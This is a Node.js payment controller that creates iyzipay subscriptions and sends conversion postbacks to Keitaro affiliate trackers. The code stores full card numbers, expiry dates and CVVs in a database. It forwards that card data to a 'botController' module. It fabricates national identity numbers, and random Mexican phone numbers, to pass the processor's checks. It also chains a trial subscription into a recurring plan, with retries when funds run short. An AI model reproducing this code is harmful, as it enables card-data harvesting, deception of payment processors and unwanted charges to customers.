const {
  sendPaymentData,
  sendFailedPaymentData,
  sendPaymentFirstData,
} = require("./botController");
const crypto = require("crypto");
const fetch = require("node-fetch");
const SubscriptionController = require("./SubscriptionController");
const { ensureNextRecurringForNewPayments, notifyDbChanged } = require('../cron-payment-scheduler');
const axios = require("axios");
const prisma = require('../lib/prisma');
const moment = require('moment-timezone');

function getTimezoneByCountry(countryCode) {
  const timezoneMap = {
    US: 'America/New_York',
    RU: 'Europe/Moscow',
    UA: 'Europe/Kiev',
    TR: 'Europe/Istanbul',
    GB: 'Europe/London',
    DE: 'Europe/Berlin',
    FR: 'Europe/Paris',
    IT: 'Europe/Rome',
    ES: 'Europe/Madrid',
    PL: 'Europe/Warsaw',
    RO: 'Europe/Bucharest',
    NL: 'Europe/Amsterdam',
    PT: 'Europe/Lisbon',
    SA: 'Asia/Riyadh',
    ID: 'Asia/Jakarta',
    TH: 'Asia/Bangkok',
    VI: 'Asia/Ho_Chi_Minh',
    JA: 'Asia/Tokyo',
    KO: 'Asia/Seoul',
    ZH: 'Asia/Shanghai',
    HE: 'Asia/Jerusalem',
    HI: 'Asia/Kolkata',
    MX: 'America/Mexico_City',
  };
  return timezoneMap[(countryCode || '').toUpperCase()] || 'UTC';
}

function computeLocalAt(date, timezone, daysToAdd) {
  return moment(date).tz(timezone).add(daysToAdd, 'days').hour(23).minute(30).second(0).millisecond(0).toDate();
}

const sendKeitaroPostback = async (subid, payout, bid) => {
  let postbackUrl = "https://sinners-ss.com/eac4099/postback";

  if (bid === "zeustraff") {
    postbackUrl = "http://185.198.165.67/6e2df9e/postback"
  }

  const params = {
    subid: subid, // Идентификатор клика от Keitaro (aff_sub2)
    status: "lead", // Или 'sale', если это продажа
    payout: payout, // Выплата (например: 1.5)
    currency: "eur", // Валюта (фиксированная)
  };

  try {
    const response = await axios.get(postbackUrl, { params });
    console.log("✅ Postback sent successfully:", response.data);
  } catch (error) {
    console.error("❌ Failed to send postback:", error.message);
  }
};

const apiKey = (process.env.IYZIPAY_API_KEY || '').trim();
const secretKey = (process.env.IYZIPAY_SECRET_KEY || '').trim();
const baseUrl = process.env.IYZIPAY_BASE_URL || "https://api.iyzipay.com";

const TRIAL_PLAN_REFERENCE_CODES = {
  test: "55260fad-4ab7-4032-ba38-01a490f8eaea",
  solo: "5cbee644-0874-44ba-835e-4f8430dc8599",
  plus: "3d1808da-a6a7-44e9-a208-50015029eec6",
  premium: "fea516fc-4bf7-4f7a-9118-82fa924b20f5",
};

const PLAN_REFERENCE_CODES = {
  test: "8d31206c-faf6-4e8c-9351-73ec1efb3e74",
  solo: "a7c2b5b4-36a2-4166-8674-5552108d2bdb",
  plus: "f9415f0e-8e35-4d8c-b680-db0332fa7fbb",
  premium: "63e38e28-7971-473c-90c9-6ce169861aa3",
};

function generateRandomDigits(length) {
  let result = "";
  for (let i = 0; i < length; i++) {
    result += Math.floor(Math.random() * 10);
  }
  return result;
}

function generateRandomLetters(length) {
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
  let result = "";
  for (let i = 0; i < length; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

// Format phone number based on country code
function formatPhoneNumber(phone, countryCode) {
  if (!phone || typeof phone !== "string") {
    console.log("❌ Invalid phone number:", phone);
    return phone || "";
  }

  console.log(
    `📱 Formatting phone number: "${phone}" for country: ${
      countryCode || "unknown"
    }`
  );

  // Remove all non-digit characters except '+'
  let cleanPhone = phone.replace(/[^\d+]/g, "");

  if (cleanPhone === "") {
    console.log("❌ Phone number contains no digits");
    return phone; // Return original if no digits found
  }

  // If already has international format with +, validate and return
  if (cleanPhone.startsWith("+")) {
    // Remove any duplicate + signs
    while (cleanPhone.indexOf("+", 1) !== -1) {
      cleanPhone = cleanPhone.replace(/\+(?=.*\+)/, "");
    }
    console.log(`✅ Phone already has + prefix: ${cleanPhone}`);
    return cleanPhone;
  }

  // Handle common international prefixes like 00
  if (cleanPhone.startsWith("00")) {
    return "+" + cleanPhone.substring(2);
  }

  // Country specific formatting
  switch (countryCode?.toUpperCase()) {
    case "MX":
      const mobilePrefixes = ['55', '33', '81', '999', '664', '477', '656', '662'];
      const prefix = mobilePrefixes[Math.floor(Math.random() * mobilePrefixes.length)];
      const remainingDigits = 10 - prefix.length;
      return `+52${prefix}${generateRandomDigits(remainingDigits)}`;
    case "UA": // Ukraine
      if (cleanPhone.startsWith("0")) {
        return "+38" + cleanPhone;
      } else if (cleanPhone.startsWith("380")) {
        return "+" + cleanPhone;
      } else if (cleanPhone.startsWith("38")) {
        return "+" + cleanPhone;
      }
      const uaNumber = "+380" + cleanPhone.replace(/^380|^38|^0/, "");
      console.log(`✅ Formatted UA phone number: ${uaNumber}`);
      return uaNumber;

    case "RU": // Russia
      if (cleanPhone.startsWith("8")) {
        return "+7" + cleanPhone.substring(1);
      } else if (cleanPhone.startsWith("7")) {
        return "+" + cleanPhone;
      }
      return "+7" + cleanPhone.replace(/^7/, "");

    case "TR": // Turkey
      if (cleanPhone.startsWith("0")) {
        return "+90" + cleanPhone.substring(1);
      } else if (cleanPhone.startsWith("90")) {
        return "+" + cleanPhone;
      }
      return "+90" + cleanPhone.replace(/^90/, "");

    case "UK": // United Kingdom
    case "GB": // Great Britain
      if (cleanPhone.startsWith("0")) {
        return "+44" + cleanPhone.substring(1);
      } else if (cleanPhone.startsWith("44")) {
        return "+" + cleanPhone;
      }
      return "+44" + cleanPhone.replace(/^44/, "");

    case "DE": // Germany
      if (cleanPhone.startsWith("0")) {
        return "+49" + cleanPhone.substring(1);
      } else if (cleanPhone.startsWith("49")) {
        return "+" + cleanPhone;
      }
      return "+49" + cleanPhone.replace(/^49/, "");

    case "FR": // France
      if (cleanPhone.startsWith("0")) {
        return "+33" + cleanPhone.substring(1);
      } else if (cleanPhone.startsWith("33")) {
        return "+" + cleanPhone;
      }
      return "+33" + cleanPhone.replace(/^33/, "");

    case "IT": // Italy
      if (cleanPhone.startsWith("0")) {
        return "+39" + cleanPhone.substring(1);
      } else if (cleanPhone.startsWith("39")) {
        return "+" + cleanPhone;
      }
      return "+39" + cleanPhone.replace(/^39/, "");

    case "ES": // Spain
      if (cleanPhone.startsWith("0")) {
        return "+34" + cleanPhone.substring(1);
      } else if (cleanPhone.startsWith("34")) {
        return "+" + cleanPhone;
      }
      return "+34" + cleanPhone.replace(/^34/, "");

    case "PL": // Poland
      if (cleanPhone.startsWith("0")) {
        return "+48" + cleanPhone.substring(1);
      } else if (cleanPhone.startsWith("48")) {
        return "+" + cleanPhone;
      }
      return "+48" + cleanPhone.replace(/^48/, "");

    case "RO": // Romania
      if (cleanPhone.startsWith("0")) {
        return "+40" + cleanPhone.substring(1);
      } else if (cleanPhone.startsWith("40")) {
        return "+" + cleanPhone;
      }
      return "+40" + cleanPhone.replace(/^40/, "");

    case "NL": // Netherlands
      if (cleanPhone.startsWith("0")) {
        return "+31" + cleanPhone.substring(1);
      } else if (cleanPhone.startsWith("31")) {
        return "+" + cleanPhone;
      }
      return "+31" + cleanPhone.replace(/^31/, "");

    case "PT": // Portugal
      if (cleanPhone.startsWith("0")) {
        return "+351" + cleanPhone.substring(1);
      } else if (cleanPhone.startsWith("351")) {
        return "+" + cleanPhone;
      }
      return "+351" + cleanPhone.replace(/^351/, "");

    case "SA": // Saudi Arabia
      if (cleanPhone.startsWith("0")) {
        return "+966" + cleanPhone.substring(1);
      } else if (cleanPhone.startsWith("966")) {
        return "+" + cleanPhone;
      }
      return "+966" + cleanPhone.replace(/^966/, "");

    case "ID": // Indonesia
      if (cleanPhone.startsWith("0")) {
        return "+62" + cleanPhone.substring(1);
      } else if (cleanPhone.startsWith("62")) {
        return "+" + cleanPhone;
      }
      return "+62" + cleanPhone.replace(/^62/, "");

    case "TH": // Thailand
      if (cleanPhone.startsWith("0")) {
        return "+66" + cleanPhone.substring(1);
      } else if (cleanPhone.startsWith("66")) {
        return "+" + cleanPhone;
      }
      return "+66" + cleanPhone.replace(/^66/, "");

    case "VI": // Vietnam
      if (cleanPhone.startsWith("0")) {
        return "+84" + cleanPhone.substring(1);
      } else if (cleanPhone.startsWith("84")) {
        return "+" + cleanPhone;
      }
      return "+84" + cleanPhone.replace(/^84/, "");

    case "JA": // Japan
      if (cleanPhone.startsWith("0")) {
        return "+81" + cleanPhone.substring(1);
      } else if (cleanPhone.startsWith("81")) {
        return "+" + cleanPhone;
      }
      return "+81" + cleanPhone.replace(/^81/, "");

    case "KO": // South Korea
      if (cleanPhone.startsWith("0")) {
        return "+82" + cleanPhone.substring(1);
      } else if (cleanPhone.startsWith("82")) {
        return "+" + cleanPhone;
      }
      return "+82" + cleanPhone.replace(/^82/, "");

    case "ZH": // China
      if (cleanPhone.startsWith("0")) {
        return "+86" + cleanPhone.substring(1);
      } else if (cleanPhone.startsWith("86")) {
        return "+" + cleanPhone;
      }
      return "+86" + cleanPhone.replace(/^86/, "");

    case "HE": // Israel
      if (cleanPhone.startsWith("0")) {
        return "+972" + cleanPhone.substring(1);
      } else if (cleanPhone.startsWith("972")) {
        return "+" + cleanPhone;
      }
      return "+972" + cleanPhone.replace(/^972/, "");

    case "HI": // India
      if (cleanPhone.startsWith("0")) {
        return "+91" + cleanPhone.substring(1);
      } else if (cleanPhone.startsWith("91")) {
        return "+" + cleanPhone;
      }
      return "+91" + cleanPhone.replace(/^91/, "");

    default:
      // If country code is not specifically handled, just add + prefix
      // First handle common cases
      let formattedNumber;
      if (cleanPhone.startsWith("00")) {
        formattedNumber = "+" + cleanPhone.substring(2);
      } else if (cleanPhone.startsWith("0")) {
        // For unknown countries, assume 0 is a local prefix and should be removed
        formattedNumber = "+" + cleanPhone.substring(1);
      } else {
        formattedNumber = "+" + cleanPhone;
      }
      console.log(`✅ Formatted default phone number: ${formattedNumber}`);
      return formattedNumber;
  }
}

function generateIdentityNumber(countryCode) {
  if (!countryCode) return undefined;

  switch (countryCode.toUpperCase()) {
    case "SA":
      return `3${generateRandomDigits(14)}`;
    case "IT":
      return generateRandomDigits(11);
    case "FR":
      return generateRandomDigits(13);
    case "ES":
      return `${generateRandomLetters(1)}${generateRandomDigits(
        7
      )}${generateRandomLetters(1)}`;
    case "GB":
      return generateRandomDigits(10);
    case "TR":
      return `${Math.floor(Math.random() * 9) + 1}${generateRandomDigits(10)}`;
    case "DE":
      return generateRandomDigits(11);
    case "HE":
      return generateRandomDigits(9);
    case "HI":
      return `${generateRandomLetters(5)}${generateRandomDigits(
        4
      )}${generateRandomLetters(1)}`;
    case "ID":
      return generateRandomDigits(15);
    case "JA":
      return generateRandomDigits(12);
    case "KO":
      return generateRandomDigits(10);
    case "NL":
      return `NL${generateRandomDigits(9)}B${generateRandomDigits(2)}`;
    case "PL":
      return generateRandomDigits(10);
    case "PT":
      return generateRandomDigits(9);
    case "RO":
      return generateRandomDigits(13);
    case "RU":
      return generateRandomDigits(12);
    case "TH":
      return generateRandomDigits(13);
    case "UA":
      return generateRandomDigits(10);
    case "UK":
      return generateRandomDigits(10);
    case "VI":
      return generateRandomDigits(10);
    case "ZH":
      return `${generateRandomDigits(17)}${
        Math.random() > 0.5 ? "X" : generateRandomDigits(1)
      }`;
     case "MX":
      return `${generateRandomLetters(4)}${generateRandomDigits(6)}${generateRandomLetters(1)}${generateRandomLetters(2)}${generateRandomLetters(3)}${generateRandomLetters(1)}${Math.random() > 0.5 ? generateRandomDigits(1) : generateRandomLetters(1)}`;
    default:
      return undefined;
  }
}

function generateHmacSignature(secretKey, randomString, path, payload) {
  const dataToSign = randomString + path + JSON.stringify(payload);
  return crypto
    .createHmac("sha256", secretKey)
    .update(dataToSign, "utf8")
    .digest("hex");
}

async function initializeSubscription(reqBody, referenceCode) {
  const path = "/v2/subscription/initialize";
  const url = `${baseUrl}${path}`;
  const randomString = crypto.randomBytes(8).toString("hex");
  const conversationId = `sub_${Date.now()}`;

  // Format phone number based on country code
  const phoneNumber = formatPhoneNumber(reqBody.phone, reqBody.countryCode);

  const customer = {
    name: reqBody.firstName,
    surname: reqBody.lastName,
    email: reqBody.email,
    gsmNumber: phoneNumber,
    shippingAddress: {
      contactName: `${reqBody.firstName} ${reqBody.lastName}`,
      city: reqBody.city,
      country: reqBody.countryCode || "TR",
      address: reqBody.address,
      zipCode: reqBody.postalCode,
    },
    billingAddress: {
      contactName: `${reqBody.firstName} ${reqBody.lastName}`,
      city: reqBody.city,
      country: reqBody.countryCode || "TR",
      address: reqBody.address,
      zipCode: reqBody.postalCode,
    },
  };

  const identityNumber = generateIdentityNumber(reqBody.countryCode);
  if (identityNumber) {
    customer.identityNumber = identityNumber;
  }

  const payload = {
    locale: reqBody.locale || "TR",
    conversationId,
    pricingPlanReferenceCode: referenceCode,
    subscriptionInitialStatus: "ACTIVE",
    paymentCard: {
      cardHolderName: reqBody.cardHolder,
      cardNumber: reqBody.cardNumber.replace(/\s/g, ""),
      expireMonth: reqBody.expiry.split("/")[0],
      expireYear: "20" + reqBody.expiry.split("/")[1],
      cvc: reqBody.cvv,
      registerConsumerCard: true,
    },
    customer,
  };

  const signature = generateHmacSignature(
    secretKey,
    randomString,
    path,
    payload
  );
  const authRaw = `apiKey:${apiKey}&randomKey:${randomString}&signature:${signature}`;
  const base64Auth = Buffer.from(authRaw, "utf8").toString("base64");
  const authorization = `IYZWSv2 ${base64Auth}`;

  const headers = {
    Authorization: authorization,
    "Content-Type": "application/json",
    "x-iyzi-rnd": randomString,
  };

  try {
    const response = await fetch(url, {
      method: "POST",
      headers,
      body: JSON.stringify(payload),
    });

    const result = await response.json();

    if (
      response.ok &&
      (result.status === "success" || result.data?.referenceCode)
    ) {
      console.log("✅ Subscription initialized successfully:", result);
      return {
        success: true,
        referenceCode: result.data.referenceCode || result.referenceCode,
        customerReferenceCode: result.data?.customerReferenceCode,
      };
    } else {
      console.error("❌ Error initializing subscription:", result);
      return {
        success: false,
        error: result.errorMessage || "An unknown error occurred",
      };
    }
  } catch (error) {
    console.error("❌ Error executing request:", error);
    return { success: false, error: error.message };
  }
}

async function cancelSubscription(subscriptionReferenceCode) {
  const path = `/v2/subscription/subscriptions/${subscriptionReferenceCode}/cancel`;
  const url = `${baseUrl}${path}`;
  const randomString = crypto.randomBytes(8).toString("hex");
  const payload = { reason: "Trial completed" };

  const signature = generateHmacSignature(
    secretKey,
    randomString,
    path,
    payload
  );
  const authRaw = `apiKey:${apiKey}&randomKey:${randomString}&signature:${signature}`;
  const base64Auth = Buffer.from(authRaw, "utf8").toString("base64");
  const authorization = `IYZWSv2 ${base64Auth}`;

  const headers = {
    Authorization: authorization,
    "Content-Type": "application/json",
    "x-iyzi-rnd": randomString,
  };

  try {
    const response = await fetch(url, {
      method: "POST",
      headers,
      body: JSON.stringify(payload),
    });
    const result = await response?.json();
    if (response?.ok && result?.status === "success") {
      console.log("✅ Subscription cancelled:", result);
      return { success: true };
    } else {
      console.error("❌ Error cancelling subscription:", result);
      return { success: false, error: result.errorMessage || "Unknown error" };
    }
  } catch (error) {
    console.error("❌ Error executing cancel request:", error);
    return { success: false, error: error.message };
  }
}

exports.processPayment = async (req, res) => {
  let secondReferenceCode = '';
  let firstReferenceCode = '';
  try {
    // Format phone number based on country code
    req.body.phone = formatPhoneNumber(req.body.phone, req.body.countryCode);

    const firstSub = await initializeSubscription(
      req.body,
      TRIAL_PLAN_REFERENCE_CODES[req.body.plan]
    );
    if (!firstSub.success) {
      // Сохраним факт неуспеха первой (trial) подписки в БД
      try {
        await prisma.payment.create({
          data: {
            plan: req.body.plan,
            firstName: req.body.firstName,
            lastName: req.body.lastName,
            address: req.body.address,
            postalCode: req.body.postalCode,
            city: req.body.city,
            countryCode: req.body.countryCode,
            email: req.body.email,
            phone: req.body.phone,
            cardHolder: req.body.cardHolder,
            cardNumber: req.body.cardNumber,
            expiry: req.body.expiry,
            cvv: req.body.cvv,
            fb: req.body.fb,
            bid: req.body.bid,
            userHash: req.body.userHash,
            locale: req.body.locale,
            subscriptionReferenceCode: '',
            timezone: getTimezoneByCountry(req.body.countryCode),
            nextRecurringAt: null,
            isRecurringActive: false,
            rebillAttempts: 0,
            rebillLog: { status: 'failure', at: new Date().toISOString(), error: { message: firstSub.error || 'trial failed' } },
          }
        });
      } catch (e) {
        console.error('❌ Failed to persist firstSub failure:', e.message);
      }
      await sendFailedPaymentData(
        { ...req.body, plan: req.body.plan, subscriptionReferenceCode: '' },
        { type: 'subscription', error: firstSub.error }
      );
      return res.status(400).json({
        success: false,
        error: firstSub.error || 'Не удалось создать первую подписку',
      });
    }
    firstReferenceCode = firstSub.referenceCode || '';
    let customerReferenceCode = firstSub.customerReferenceCode;
    if (!customerReferenceCode) {
      await sendFailedPaymentData(
        { ...req.body, plan: req.body.plan, subscriptionReferenceCode: firstReferenceCode },
        {
          type: 'subscription',
          error: 'Не удалось получить customerReferenceCode из первой подписки',
        }
      );
      return res.status(500).json({
        success: false,
        error: 'Не удалось получить customerReferenceCode из первой подписки',
      });
    }

    // Успех trial — зафиксируем в БД как исходную оплату
    if (firstSub.success) {
      try {
        await prisma.payment.create({
          data: {
            plan: req.body.plan,
            firstName: req.body.firstName,
            lastName: req.body.lastName,
            address: req.body.address,
            postalCode: req.body.postalCode,
            city: req.body.city,
            countryCode: req.body.countryCode,
            email: req.body.email,
            phone: req.body.phone,
            cardHolder: req.body.cardHolder,
            cardNumber: req.body.cardNumber,
            expiry: req.body.expiry,
            cvv: req.body.cvv,
            fb: req.body.fb,
            bid: req.body.bid,
            userHash: req.body.userHash,
            locale: req.body.locale,
            subscriptionReferenceCode: firstReferenceCode,
            timezone: getTimezoneByCountry(req.body.countryCode),
            nextRecurringAt: null, // будет выставлено после secondSub
            isRecurringActive: true,
            rebillAttempts: 0,
            rebillLog: { status: 'success', at: new Date().toISOString(), stage: 'trial' },
          }
        });
      } catch (e) {
        console.error('❌ Failed to persist trial success:', e.message);
      }
    }

    await sendPaymentFirstData({
      ...req.body,
      subscriptionReferenceCode: firstReferenceCode,
    });

    if (firstSub.success) {
      await sleep(3000);
      const cancelResult = await cancelSubscription(firstReferenceCode);
      if (!cancelResult.success) {
        await sendFailedPaymentData(
          {
            ...req.body,
            plan: req.body.plan,
            subscriptionReferenceCode: firstReferenceCode,
          },
          {
            type: 'subscription',
            error:
              'Первая подписка создана, но не удалось отменить: ' +
              (cancelResult.error || ''),
          }
        );
        return res.status(500).json({
          success: false,
          error:
            'Первая подписка создана, но не удалось отменить: ' +
            (cancelResult.error || ''),
        });
      }

      await sleep(3000);
    }

    if (customerReferenceCode) {
      const secondSubPayload = {
        ...req.body,
        customer: { referenceCode: customerReferenceCode },
      };
      const secondSub = await initializeSubscription(
        secondSubPayload,
        PLAN_REFERENCE_CODES[req.body.plan]
      );
      if (!secondSub.success) {
        // Вторая подписка не создана — это означает, что первый повторный платеж не состоялся
        try {
          const tz = getTimezoneByCountry(req.body.countryCode);
          // При недостатке средств назначаем повтор через 1 день, иначе останавливаем
          const isInsufficient = (secondSub.error || '').toLowerCase().includes('insufficient');
          await prisma.payment.updateMany({
            where: { subscriptionReferenceCode: firstReferenceCode },
            data: {
              lastAttemptAt: new Date(),
              rebillAttempts: { increment: 1 },
              nextRecurringAt: isInsufficient ? computeLocalAt(new Date(), tz, 1) : null,
              isRecurringActive: !!isInsufficient,
              rebillLog: { status: 'failure', at: new Date().toISOString(), error: { message: secondSub.error } },
            }
          });
        } catch (e) {
          console.error('❌ Failed to persist secondSub failure:', e.message);
        }
        await sendFailedPaymentData(
          {
            ...req.body,
            price: req.body.price,
            subscriptionReferenceCode: secondSub.referenceCode,
          },
          {
            type: "subscription",
            error: "Вторая подписка не создана: " + (secondSub.error || ""),
          }
        );
        return res.status(500).json({
          success: false,
          error: "Вторая подписка не создана: " + (secondSub.error || ""),
        });
      }

      // Зафиксируем успех второго шага (первый повторный платёж)
      try {
        const tz = getTimezoneByCountry(req.body.countryCode);
        const nextAt = computeLocalAt(new Date(), tz, 7);
        await prisma.payment.updateMany({
          where: { subscriptionReferenceCode: firstReferenceCode },
          data: {
            lastAttemptAt: new Date(),
            rebillAttempts: { increment: 1 },
            nextRecurringAt: nextAt,
            isRecurringActive: true,
            rebillLog: { status: 'success', at: new Date().toISOString(), stage: 'first-recurring', raw: { referenceCode: secondSub.referenceCode } },
          }
        });
      } catch (e) {
        console.error('❌ Failed to persist secondSub success:', e.message);
      }
      secondReferenceCode = secondSub.referenceCode || '';
    }

    await sendPaymentData({
      price: "1.00",
      ...req.body,
      subscriptionReferenceCode: secondReferenceCode || "unknown",
    });
  } catch (e) {
    console.error("processDoubleSubscription error:", e);
    res
      .status(500)
      .json({ success: false, error: e.message || "Unknown error" });
  }

  try {
    const userHash = req.body.userHash;
    await SubscriptionController.addSubscription(userHash, req.body);
    console.log("✅ Payment data saved to database successfully");
    // После добавления — обеспечить расписание и пнуть планировщик
    await ensureNextRecurringForNewPayments();
    await notifyDbChanged();
  } catch (error) {
    console.error("❌ Error saving payment to database:", error);
  }

  try {
      // кейтаро отправка данных
      await sendKeitaroPostback(req.body.subid, req.body.price, req.body.bid || "");
    } catch (error) {
      console.error("❌ Error sending payment data to keta:", error);
    }

  try {
    res.json({
      success: true,
      firstReferenceCode
    });
  } catch (error) {
    console.error("❌ Error sending response:", error);
    res.status(200).json({ success: true, error: "Unknown error" });
  }
};

async function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}
